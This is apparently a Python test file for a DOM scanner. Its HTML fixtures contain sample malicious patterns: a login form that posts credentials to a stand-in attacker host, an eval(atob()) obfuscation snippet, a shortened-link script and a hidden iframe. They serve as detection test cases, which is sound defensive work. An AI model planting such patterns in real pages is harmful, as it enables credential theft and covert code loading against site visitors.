import os
import sys
from unittest.mock import patch, MagicMock

# Add root directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.core.dom_scanner import DOMScanner

def test_headless_dom_scan():
    print("Starting Headless DOM Scan Test Suite...")
    scanner = DOMScanner()
    
    test_cases = [
        {
            "name": "Form Hijacking Case",
            "url": "http://phish-site.com",
            "html": """
                <html>
                    <body>
                        <form action="http://hacker-server.ru/collect" method="POST">
                            <input type="text" name="username">
                            <input type="password" name="password">
                            <button type="submit">Login</button>
                        </form>
                    </body>
                </html>
            """,
            "expected_threat": "FORM HIJACKING"
        },
        {
            "name": "Hidden Sensitive Field Case",
            "url": "http://sneaky-site.net",
            "html": """
                <html>
                    <body>
                        <form action="/login">
                            <input type="hidden" name="secret_token" value="12345">
                            <input type="text" name="user">
                        </form>
                    </body>
                </html>
            """,
            "expected_threat": "SNEAKY ELEMENT"
        },
        {
            "name": "Malicious JS Obfuscation Case",
            "url": "http://js-attack.io",
            "html": """
                <html>
                    <body>
                        <script>
                            var encoded = "YmFkX3NjcmlwdA==";
                            eval(atob(encoded));
                        </script>
                    </body>
                </html>
            """,
            "expected_threat": "JS OBFUSCATION"
        },
        {
            "name": "Suspicious External Resource Case",
            "url": "http://resource-phish.xyz",
            "html": """
                <html>
                    <head>
                        <script src="https://bit.ly/malicious-payload.js"></script>
                    </head>
                </html>
            """,
            "expected_threat": "SUSPICIOUS RESOURCE"
        },
        {
            "name": "Stealth Iframe Case",
            "url": "http://iframe-trap.com",
            "html": """
                <html>
                    <body>
                        <iframe src="http://hidden-malware-site.biz" style="display:none"></iframe>
                        <h1>Welcome to Legit Site</h1>
                    </body>
                </html>
            """,
            "expected_threat": "STEALTH IFRAME"
        }
    ]
    
    passed = 0
    print("\n" + "="*80)
    print(f"{'SCENARIO':<35} | {'RISK':<5} | {'THREAT DETECTED'}")
    print("-" * 80)
    
    with patch('requests.get') as mock_get:
        for tc in test_cases:
            # Mock the HTTP response
            mock_response = MagicMock()
            mock_response.text = tc['html']
            mock_response.status_code = 200
            mock_get.return_value = mock_response
            
            res = scanner.scan(tc['url'])
            risk = res['risk_score']
            threats = ", ".join(res['threats_found'])
            
            print(f"{tc['name']:<35} | {risk:<5} | {threats[:40]}...")
            
            if any(tc['expected_threat'] in t for t in res['threats_found']):
                passed += 1
            else:
                print(f"FAILED: Expected {tc['expected_threat']} not found in {res['threats_found']}")

    print("="*80)
    print(f"DOM SCAN SUMMARY: {passed}/{len(test_cases)} Passed")
    print("="*80)
    
    if passed == len(test_cases):
        print("\nAll Headless DOM Scan cases passed successfully!")
    else:
        sys.exit(1)

if __name__ == "__main__":
    test_headless_dom_scan()
